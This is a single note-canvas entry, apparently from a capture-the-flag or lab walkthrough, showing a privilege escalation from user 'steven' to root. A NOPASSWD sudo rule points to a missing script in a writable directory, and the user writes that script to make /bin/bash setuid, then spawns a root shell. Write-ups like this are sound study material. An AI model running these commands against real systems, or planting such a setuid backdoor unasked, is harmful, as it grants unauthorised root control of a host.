		{"id":"f42464886ad931a7","type":"text","text":"## 5. steven → root\n\n```\nsudo -l\n(root) NOPASSWD: /opt/tools/server-health.sh\n```\n\nScript didn't exist; `/opt` owned/writable by steven:\n```\nmkdir -p /opt/tools\ncat > /opt/tools/server-health.sh << 'EOF'\n#!/bin/bash\nchmod +s /bin/bash\nEOF\nchmod +x /opt/tools/server-health.sh\nsudo -u root /opt/tools/server-health.sh\n```\n\n```\n/bin/bash -p\nwhoami\nroot\n```","x":3440,"y":4580,"width":520,"height":420,"color":"4"},
